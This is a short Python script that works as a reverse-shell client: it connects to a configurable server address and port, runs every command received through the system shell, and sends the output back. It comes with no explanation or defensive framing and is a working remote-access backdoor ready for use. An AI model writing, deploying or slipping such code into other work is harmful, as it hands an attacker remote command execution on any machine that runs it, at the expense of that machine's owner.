import socket
import subprocess

SERVER_HOST = '127.0.0.1'  # Change to server IP
SERVER_PORT = 9999

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((SERVER_HOST, SERVER_PORT))
        while True:
            command = client.recv(4096).decode()
            if not command:
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e).encode()
            client.send(output)
    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    connect_to_server()
